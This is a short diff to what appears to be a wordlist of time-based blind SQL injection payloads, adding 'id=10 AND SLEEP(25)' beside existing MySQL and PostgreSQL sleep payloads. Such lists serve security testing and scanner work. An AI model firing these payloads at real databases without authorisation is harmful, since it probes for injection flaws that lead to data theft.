@@ -1,3 +1,7 @@
+id=10 AND SLEEP(25)
+
+
+
 SELECT CASE WHEN (1=1) THEN pg_sleep(25) ELSE pg_sleep(0) END--
 
 1'=sleep(25)='1
